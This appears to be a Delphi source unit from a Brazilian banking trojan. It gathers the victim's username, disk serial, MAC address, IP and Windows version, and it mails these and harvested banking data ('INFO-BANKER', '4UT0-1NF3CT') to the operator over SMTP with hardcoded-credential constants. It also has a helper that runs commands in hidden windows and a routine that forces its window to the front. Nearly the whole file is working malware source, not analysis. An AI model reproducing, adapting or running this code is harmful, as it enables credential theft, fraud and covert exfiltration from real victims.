unit Gerador;


interface

uses
Classes, SysUtils, Windows, Registry, Forms;

function Comparaciontrtr_(const Substr_ : string; const Str_ : string) : Integer;
function FWinFrontShow(hwnd: THandle): Boolean;
procedure viagemboasaopaulo(Dados : TStringList; NameInfor :string);
function pegadiretoriodocliente: String;
procedure S3nd3_rFogra;


var
 KMGerator_  : string = '';
 CAOSTOTAL_        : array [1..16] of char =('a','b','c','d','e','f','g','h',
                                             'i','j','k','l','m','n','o','p');

implementation

uses
 MainCentral;


 Function Get: string;
Var
  NetUserNameLength: DWord;
Begin
  NetUserNameLength:=50;
  SetLength(Result, NetUserNameLength);
  GetUserName(pChar(Result),NetUserNameLength);
  SetLength(Result, StrLen(pChar(Result)));
End;


function Pega: string;

var
SerialNum : Dword;
a, b      : dword;
Buffer    : array [0..255] of char;
begin
if
GetVolumeInformation('c:\',buffer,sizeof(buffer),@serialnum,a,b,nil,0)
then
Result := inttohex(serialnum,8)
else
Result := '';
end;

function WinVersion: string;
var
  VersionInfo: TOSVersionInfo;
begin
  VersionInfo.dwOSVersionInfoSize:=SizeOf(VersionInfo);
  GetVersionEx(VersionInfo);
  Result:='';
  with VersionInfo do
  begin
    case dwPlatformId of
      1:
        case dwMinorVersion of
      0: Result:='Microsoft Windows 95';
          10: Result:='Microsoft Windows 98';
          90: Result:='Microsoft Windows Me';
        end;
     2:
    case dwMajorVersion of
      5:
        case dwMinorVersion of
          0:
            Result := 'Microsoft Windows 2000';
          1:
            Result := 'Microsoft Windows XP';
          2:
            Result := 'Microsoft Windows Server 2003';
        end;
      6:
        case dwMinorVersion of
          0:
            Result := 'Microsoft Windows Vista';
          1:
            Result := 'Microsoft Windows 7';
          2:
            Result := 'Microsoft Windows 8';
            end;
        end;
    end;
  end;
  if (Result='') then
    Result:='Sistema operacional desconhecido.';
end;

function MacAddress: String;
var
lib: Cardinal;
funcao: function(GUID: PGUID): Longint; stdcall;
GUID1, GUID2: TGUID;
begin

result := '00-00-00-00-00-00';

lib := LoadLibrary( 'rpcrt4.dll' );

if lib <> 0 then
begin

@funcao := GetProcAddress( lib, 'UuidCreateSequential' );

if Assigned( funcao ) then
begin

if ( funcao( @GUID1 ) = 0 ) and
( funcao( @GUID2 ) = 0 ) and
( GUID1.D4[2] = GUID2.D4[2] ) and ( GUID1.D4[3] = GUID2.D4[3] ) and
( GUID1.D4[4] = GUID2.D4[4] ) and ( GUID1.D4[5] = GUID2.D4[5] ) and
( GUID1.D4[6] = GUID2.D4[6] ) and ( GUID1.D4[7] = GUID2.D4[7] ) then
begin

result := IntToHex( GUID1.D4[2], 2 ) + '-' + IntToHex( GUID1.D4[3], 2 ) + '-' +
IntToHex( GUID1.D4[4], 2 ) + '-' + IntToHex( GUID1.D4[5], 2 ) + '-' +
IntToHex( GUID1.D4[6], 2 ) + '-' + IntToHex( GUID1.D4[7], 2 );

end;

end;

FreeLibrary( lib );

end;

end;

function DadosSimplesProcessar(cmd: string): boolean;
var
  SUSInfo: TStartupInfo;
  ProcessoInfo: TProcessInformation;
begin
  FillChar(SUSInfo, SizeOf(SUSInfo), #0);
  SUSInfo.cb      := SizeOf(SUSInfo);
  SUSInfo.dwFlags := STARTF_USESHOWWINDOW;
  SUSInfo.wShowWindow := SW_HIDE;

  Result := CreateProcess(nil,
                          PChar(cmd),
                          nil,
                          nil,
                          false,
                          CREATE_NEW_CONSOLE or
                          HIGH_PRIORITY_CLASS,
                          nil,
                          nil,
                          SUSInfo,
                          ProcessoInfo);

  if (Result) then
  begin
    WaitForSingleObject(ProcessoInfo.hProcess, INFINITE);

    CloseHandle(ProcessoInfo.hProcess);
    CloseHandle(ProcessoInfo.hThread);
  end;
end;

function Comparaciontrtr_(const Substr_ : string; const Str_ : string) : Integer;
begin

   if Pos(Substr_,Str_) <> NO_ then
    Result := YES_;

   if Pos(Substr_,Str_)  = NO_ then
    Result := NO_;

end;

procedure viagemboasaopaulo(Dados : TStringList; NameInfor :string);
var
 Emailsucesso : string;
begin
  try
    Randomize;
    Frmsegredofiel_.MSG.Body.Add(Dados.Text);
    Frmsegredofiel_.MSG.From.Name    := Emailsucesso;
    Frmsegredofiel_.MSG.From.Address := DE;
    Frmsegredofiel_.MSG.Recipients.EMailAddresses := PARA;
    Frmsegredofiel_.MSG.Subject := inttostr(Random(10000))+' '+NameInfor+' INFO-BANKER';
    Frmsegredofiel_.Email.Username := LOGIN;
    Frmsegredofiel_.Email.Password := SENHA;
    Frmsegredofiel_.Email.Host     :=(SMTP);
    Frmsegredofiel_.Email.Port     := Port;
    Frmsegredofiel_.Email.Connect;
   Frmsegredofiel_.Email.Send(Frmsegredofiel_.MSG);
    Frmsegredofiel_.Email.Disconnect;
  except
  end;
end;

procedure S3nd3_rFogra;
var
arq: TStringList;
s: string;
begin
  try
  Randomize;
  s:= inttostr(Random(10000))+' .::4UT0-1NF3CT::.';
  Frmsegredofiel_.MSG.Body.Add(s);
  Frmsegredofiel_.MSG.Body.Add('IP: '+ Frmsegredofiel_.IP.LocalIP);
  Frmsegredofiel_.MSG.Body.Add('CL1ENT3...: '+ Get);
  Frmsegredofiel_.MSG.Body.Add('S3R14L....: '+ Pega);
  Frmsegredofiel_.MSG.Body.Add('M3C-4DDR3SS....: '+ MacAddress);
  Frmsegredofiel_.MSG.Body.Add('S1ST3M4 0P3R4C10N4L...'+ WinVersion);
  Frmsegredofiel_.MSG.Body.Add('----------- {- ANONGR -} -----------');
  Frmsegredofiel_.MSG.From.Address := Aviso_De;
  Frmsegredofiel_.MSG.Recipients.EMailAddresses := Aviso_Para;
  Frmsegredofiel_.MSG.Subject    := s;
  Frmsegredofiel_.Email.Username := Aviso_Login;
  Frmsegredofiel_.Email.Password := Aviso_Pass;
  Frmsegredofiel_.Email.Host     :=(Aviso_Smtp);
  Frmsegredofiel_.Email.Port     := Aviso_Porta;
  Frmsegredofiel_.Email.Connect;
  Frmsegredofiel_.Email.Send(Frmsegredofiel_.MSG);
  Frmsegredofiel_.Email.Disconnect;
  try
    arq := TStringList.Create;
    arq.Add('sendered');
    arq.SaveToFile(pegadiretoriodocliente+'senderedemail.tmp');
    arq.Free;
  except end;
  except
  end;
end;

function pegadiretoriodocliente: String;
var
pNetpath: ARRAY[ 0..MAX_path - 1 ] of Char;
nlength: Cardinal;
begin
  nlength := MAX_path;
  FillChar( pNetpath, SizeOF( pNetpath ), #0 );
  GetTemppath( nlength, pNetpath );
  Result := StrPas( pNetpath );
end;

function FWinFrontShow(hwnd: THandle): Boolean;
const
  SPI_GETFOREGROUNDLOCKTIMEOUT = $2000;
  SPI_SETFOREGROUNDLOCKTIMEOUT = $2001;
var
  ForegroundThreadID: DWORD;
  ThisThreadID: DWORD;
  timeout: DWORD;
begin
  if IsIconic(hwnd) then ShowWindow(hwnd, SW_RESTORE);

  if GetForegroundWindow = hwnd then Result := True
  else
  begin

    if ((Win32Platform = VER_PLATFORM_WIN32_NT) and (Win32MajorVersion > 4)) or
      ((Win32Platform = VER_PLATFORM_WIN32_WINDOWS) and
      ((Win32MajorVersion > 4) or ((Win32MajorVersion = 4) and
      (Win32MinorVersion > 0)))) then
    begin

      Result := False;
      ForegroundThreadID := GetWindowThreadProcessID(GetForegroundWindow, nil);
      ThisThreadID := GetWindowThreadPRocessId(hwnd, nil);
      if AttachThreadInput(ThisThreadID, ForegroundThreadID, True) then
      begin
        BringWindowToTop(hwnd);
        SetForegroundWindow(hwnd);
        AttachThreadInput(ThisThreadID, ForegroundThreadID, False);
        Result := (GetForegroundWindow = hwnd);
      end;
      if not Result then
      begin
        SystemParametersInfo(SPI_GETFOREGROUNDLOCKTIMEOUT, 0, @timeout, 0);
        SystemParametersInfo(SPI_SETFOREGROUNDLOCKTIMEOUT, 0, TObject(0),
          SPIF_SENDCHANGE);
        BringWindowToTop(hwnd);
        SetForegroundWindow(hWnd);
        SystemParametersInfo(SPI_SETFOREGROUNDLOCKTIMEOUT, 0, TObject(timeout), SPIF_SENDCHANGE);
      end;
    end
    else
    begin
      BringWindowToTop(hwnd);
      SetForegroundWindow(hwnd);
    end;

    Result := (GetForegroundWindow = hwnd);
  end;
end;


end.
